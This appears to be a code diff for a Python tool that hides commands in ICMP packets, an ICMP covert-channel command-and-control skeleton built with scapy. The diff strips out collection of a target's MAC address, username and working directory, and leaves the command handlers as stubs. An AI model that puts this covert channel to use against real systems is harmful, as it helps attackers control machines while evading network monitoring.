@@ -13,15 +13,10 @@ class Host:
     def __init__(self):
         self.ip = get_local_ip()
         self.iface = get_iface(self.ip)
-        self.mac = get_mac(self.iface)
-        self.user = pwd.getpwuid(os.getuid())[0]
-        self.location = os.getcwd()
-        self.status = "STANDBY"
 
     def __str__(self) -> str:
         report =  f"[ Host Information ]\n"
         report += f" -- IP: {self.ip}\n"
-        report += f" -- MAC: {self.mac}\n"
         report += f" -- Interface: {self.iface}\n"
 
         return report
@@ -42,7 +37,7 @@ class Host:
         shellpack = base64.b64decode(encoded_shellpack).decode()
         unpacked = ast.literal_eval(shellpack)
         
-        print(f" $ {unpacked['command']} received from {unpacked['ip']} > {unpacked['message']}")
+        # print(f" $ {unpacked['command']} received from {unpacked['ip']}")
 
         match unpacked['command']:
             case "join":
@@ -50,59 +45,29 @@ class Host:
             case "instruction":
                 self.instruction(unpacked)
             case _:
-                print("Default case")
+                return
+        
+    def join(self, shellpack):
+        pass
 
-    def build_shellpack(self, command: str, message: str | None = None, data: str | None = None) -> dict:
+    def instruction(self, shellpack):
+        pass
+            
+    def build_shellpack(self, command: str, data: str | None = None) -> dict:
         shellpack = {
             "command": command,
-            "message": message,
             "data" : data
             }
         
-        info_dict = self.to_dict()
-        shellpack.update(info_dict)
-
-        shellpack = str(shellpack).encode('utf-8')
+        shellpack = str(shellpack).encode()
         shellpack = base64.b64encode(shellpack)
         return shellpack
-    
-    def to_dict(self) -> dict:
-        
-        out_dict = {
-                "ip": self.ip,
-                "mac": self.mac,
-                "iface": self.iface,
-                "user": self.user,
-                "location": self.location,
-                "status": self.status
-                }
 
-        return out_dict
-        
-
-    def update_status(self, status):
-        self.status = status
-        print(f" - Status of target {self.ip} has been updated to {status}")
-
-    def send(self, ip, command: str, message: str | None = None, data: str | None = None) -> bool:
-        shellpack = self.build_shellpack(command, message, data)
+    def send(self, ip, command: str, data: str | None = None) -> bool:
+        shellpack = self.build_shellpack(command, data)
         data = (IP(dst=ip, ttl=TTL)/ICMP(type=0, id=ICMP_ID)/Raw(load=shellpack))
         sr(data, timeout=0, verbose=0)
-        print(f" $ {command} sent to {ip} > {message}")
-        
-        return True
-
-class Target(Host):
-    def __init__(self, data_dict):
-        self.ip = data_dict['ip']
-        self.iface = data_dict['iface']
-        self.mac = data_dict['mac']
-        self.user = data_dict['user']
-        self.status = data_dict['status']
-
-    def update_status(self, status):
-        self.status = status
-        print(f" - Status of target {self.ip} has been updated to {status}")
+        # print(f" $ {command} sent to {ip} > {message}")
 
 def get_iface(ip) -> str:
     nics = psutil.net_if_addrs()
@@ -120,8 +85,3 @@ def get_local_ip() -> str:
     finally:
         s.close()
     return ip
-
-def get_mac(iface) -> str:
-    nics = psutil.net_if_addrs()
-    mac = ([j.address for i in nics for j in nics[i] if i==iface and j.family==psutil.AF_LINK])[0]
-    return mac.replace('-',':')
